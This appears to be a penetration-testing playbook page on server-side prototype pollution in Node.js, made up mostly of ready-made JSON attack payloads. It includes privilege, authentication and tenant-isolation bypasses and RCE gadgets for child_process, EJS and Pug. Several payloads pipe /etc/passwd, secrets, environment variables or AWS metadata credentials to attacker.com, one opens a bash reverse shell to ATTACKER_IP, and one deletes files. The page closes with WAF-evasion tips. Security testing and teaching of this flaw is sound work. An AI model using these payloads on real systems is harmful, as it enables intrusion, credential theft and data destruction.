# Prototype Pollution — Server-Side (SSPP)

## When this applies

Node.js (or other JS-server) endpoint deeply merges user JSON into config / options / user-record objects without filtering `__proto__` / `constructor.prototype` / `prototype`. Pollution is global to the process — it affects subsequent requests until the process restarts.

## Technique

1. Send JSON with `__proto__` / `constructor.prototype` to a merge endpoint.
2. Trigger a different endpoint that depends on a polluted property — boolean flags (privilege escalation), string properties (command injection via `child_process` options), numeric values (rate-limit bypass).

## Steps

### Server-Side Privilege Escalation

```json
// Admin bypass
{
    "data": "...",
    "__proto__": {
        "isAdmin": true
    }
}

// Authentication bypass
{
    "data": "...",
    "__proto__": {
        "isAuthenticated": true,
        "userId": "admin",
        "role": "administrator"
    }
}

// Authorization bypass
{
    "data": "...",
    "__proto__": {
        "canAccess": true,
        "permissions": ["read", "write", "delete"],
        "privilegeLevel": 999
    }
}

// Rate limiting bypass
{
    "data": "...",
    "__proto__": {
        "rateLimit": false,
        "bypassRateLimit": true
    }
}

// Multi-tenant isolation bypass
{
    "data": "...",
    "__proto__": {
        "tenantId": "victim-tenant-id",
        "organizationId": "victim-org-id",
        "bypassIsolation": true
    }
}

// Feature flag manipulation
{
    "data": "...",
    "__proto__": {
        "premiumFeatures": true,
        "betaAccess": true,
        "apiAccess": true
    }
}
```

### Server-Side RCE (Node.js)

```json
// RCE via execArgv (child_process.fork)
{
    "data": "...",
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('COMMAND')"
        ]
    }
}

// Specific commands
{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('curl https://attacker.com')"
        ]
    }
}

{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('rm /path/to/file')"
        ]
    }
}

{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('cat /etc/passwd > /tmp/exfil')"
        ]
    }
}

// RCE via vim shell (child_process.execSync)
{
    "data": "...",
    "__proto__": {
        "shell": "vim",
        "input": ":! COMMAND\n"
    }
}

// Specific vim payloads
{
    "__proto__": {
        "shell": "vim",
        "input": ":! curl https://attacker.com\n"
    }
}

{
    "__proto__": {
        "shell": "vim",
        "input": ":! cat /etc/passwd | curl -d @- https://attacker.com\n"
    }
}

// Reverse shell
{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"')"
        ]
    }
}

// Data exfiltration with base64
{
    "__proto__": {
        "shell": "vim",
        "input": ":! cat /path/to/secret | base64 | curl -d @- https://attacker.com\n"
    }
}

// Directory listing
{
    "__proto__": {
        "shell": "vim",
        "input": ":! ls -la /home | base64 | curl -d @- https://attacker.com\n"
    }
}

// Environment variables
{
    "__proto__": {
        "shell": "vim",
        "input": ":! env | curl -d @- https://attacker.com\n"
    }
}

// AWS metadata (SSRF + RCE)
{
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name | curl -d @- https://attacker.com')"
        ]
    }
}
```

### Mongoose Prototype Pollution (MongoDB ODM)

Mongoose query operators can be abused for prototype pollution when user input flows into query conditions or document updates:

**CVE-2023-3696 Pattern (Mongoose < 7.3.4):**
```json
// When user input is merged into a Mongoose document:
{
  "username": "admin",
  "__proto__": {
    "isAdmin": true
  }
}
// Or via $set in update operations:
{
  "$set": {
    "__proto__.isAdmin": true
  }
}
```

**Node.js net.Socket._getpeername() Gadget:**
When prototype pollution is achieved in a Node.js app, the `_getpeername()` internal method on `net.Socket` can be poisoned:
```json
{
  "__proto__": {
    "address": "127.0.0.1",
    "family": "IPv4",
    "port": 1337
  }
}
```
This makes `socket.remoteAddress` return the polluted value, bypassing IP-based access controls (e.g., admin panels restricted to localhost).

**Detection in Mongoose Apps:**
1. Send `{"__proto__": {"testprop": "1"}}` in any JSON endpoint that creates/updates documents
2. Check if `Object.prototype.testprop` is set on subsequent requests
3. Look for Mongoose version < 7.3.4 in `package.json` or `package-lock.json`

### Template Engine RCE Gadgets

**EJS Template Engine (SSPP → RCE):**
```json
{
  "__proto__": {
    "client": 1,
    "escapeFunction": "JSON.stringify; process.mainModule.require('child_process').exec('id | curl http://attacker.com/ -d @-')"
  }
}
```

**Node.js Environment Injection (SSPP → RCE):**
```json
{
  "__proto__": {
    "argv0": "node",
    "shell": "node",
    "NODE_OPTIONS": "--inspect=YOUR.oastify.com"
  }
}
```
Use Burp Collaborator DNS to confirm OOB execution.

**Pug Template Engine AST Injection (SSPP → RCE):**
```json
{
  "__proto__": {
    "block": {
      "type": "Text",
      "line": "process.mainModule.require('child_process').execSync('id > /app/static/out.txt')"
    }
  }
}
```
With `flat@5.0.0` unflatten (dot-notation):
```json
{
  "__proto__.block.type": "Text",
  "__proto__.block.line": "process.mainModule.require('child_process').execSync('cp /app/flag* /app/static/f.txt')"
}
```
- Pollution persists per-process (one shot — restart needed to clear)
- Output goes to `pug_debug_line` assignment, NOT template buffer — exfiltrate via static dir write, error channel, or OOB
- Requires `pug.compile()` to be called after pollution

**Kibana CVE-2019-7609 pattern:**
Pollute label prototype → inject env vars → `child_process` shell execution. Canonical SSPP RCE reference.

## Verifying success

- **Privilege bypass**: subsequent request to `/admin/...` returns the privileged response without re-auth.
- **RCE**: out-of-band callback (Burp Collaborator DNS/HTTP hit) confirms command execution.
- **`net.Socket` gadget**: `/admin` (localhost-only) returns 200 from a non-local source after polluting `_getpeername()`.
- **Status code / JSON spaces** detection on a *different* endpoint after pollution proves persistence.

## Common pitfalls

1. **Pollution persists between tests** — your "clean" test is contaminated by a prior pollution. Restart the Node process or use unique property names.
2. **Mongoose `Schema.strict`** — when strict mode is on, unknown fields are dropped; prototype pollution may still work via `$set` operators.
3. **`execArgv` requires fork**, not `exec`/`spawn` — only triggers when the app forks a child Node process. Look for `child_process.fork()`, `cluster`, or `worker_threads`.
4. **`shell: 'vim'` requires shell:true and a TTY** — fragile. Prefer `execArgv` for reliable RCE.
5. **WAF inspects body for `__proto__`** — try Unicode escapes, dot notation, parameter pollution, alternate content types. See `bypass-techniques.md`.

## Tools

- **`yuske/server-side-prototype-pollution`** — gadget DB for Node.js / npm
- **`silent-spring`** — Node.js RCE PoC framework
- **`pp-finder`** — CSPP/SSPP gadget discovery
- **Burp Collaborator** — OOB confirmation for RCE
- **Burp Repeater** — manual JSON crafting
- **PP Gadgets Finder (Burp BApp Store)** — automated server-side gadget identification
